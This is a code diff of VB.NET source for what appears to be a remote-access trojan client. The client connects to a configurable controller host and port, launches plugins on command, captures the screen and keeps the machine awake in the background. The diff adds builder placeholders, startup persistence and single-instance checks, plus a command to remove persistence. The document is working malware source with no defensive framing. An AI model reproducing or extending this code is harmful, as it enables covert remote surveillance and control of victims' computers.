@@ -15,12 +15,6 @@ Imports System.Windows.Forms
 Imports System.Drawing.Drawing2D
 
 Public Class C
-
-
-
-
-
-
     Public Shared Function CheckDNS()
         Dim l As IPAddress() = Dns.GetHostAddresses(H)
 
@@ -34,6 +28,11 @@ Public Class C
 
     Public Shared H As String = "127.0.0.1"
     Public Shared P As String = "5900"
+
+    Public Shared Install_D As String = "%I1%"
+    Public Shared Install_T As String = "%TIME%"
+    Public Shared Install_N As String = "%NAME%"
+
 
     Public Shared Sub Check()
 
@@ -71,12 +70,24 @@ Public Class C
 
     Public Shared Sub Main()
 
+        If Install_D = "True" Then
+
+            Dim O As New Options.Options(Install_N)
+
+            Options.Options.StartUp(Install_T)
+
+        End If
+
+        Options.Options.OneInstance()
+
         SetCurrentDirectoryA(IO.Path.GetTempPath) ''To write file later
         SetPriorityClass(Process.GetCurrentProcess.Handle, dwPriorityClass.ABOVE_NORMAL_PRIORITY_CLASS Or dwPriorityClass.PROCESS_MODE_BACKGROUND_BEGIN)
         SetProcessPriorityBoost(Process.GetCurrentProcess.Handle, False)
         SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED Or EXECUTION_STATE.ES_SYSTEM_REQUIRED Or EXECUTION_STATE.ES_AWAYMODE_REQUIRED)
 
+
         Try
+
             T.Connect(IPAddress.Parse(CheckDNS()), Integer.Parse(P))
 
             If T.Connected = True Then
@@ -161,9 +172,15 @@ Public Class C
 
                         Launch(T, packet.Plugin, packet.Function_Params, True)
 
-                    Case PacketType.MSG
+                    Case PacketType.CLOSE
 
                         NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)
+
+                    Case PacketType.U_CLOSE
+
+                        Dim O As New Options.Options(Install_N)
+
+                        Options.Options.U_StartUp()
 
                     Case PacketType.RD
 
@@ -324,7 +341,7 @@ Public Class C
                     .Type_Packet = PacketType.RD
                }
 
-                Dim Send As New Packet_Send With {
+            Dim Send As New Packet_Send With {
                     .Packet = packet
             }
 
@@ -333,12 +350,12 @@ Public Class C
             End SyncLock
 
             graphics.Dispose()
-                g2.Dispose()
-                img.Dispose()
-                Resize.Dispose()
-                MS.Dispose()
-                encoderParameter.Dispose()
-                encoderParameters.Dispose()
+            g2.Dispose()
+            img.Dispose()
+            Resize.Dispose()
+            MS.Dispose()
+            encoderParameter.Dispose()
+            encoderParameters.Dispose()
 
         Catch ex As Exception
         End Try
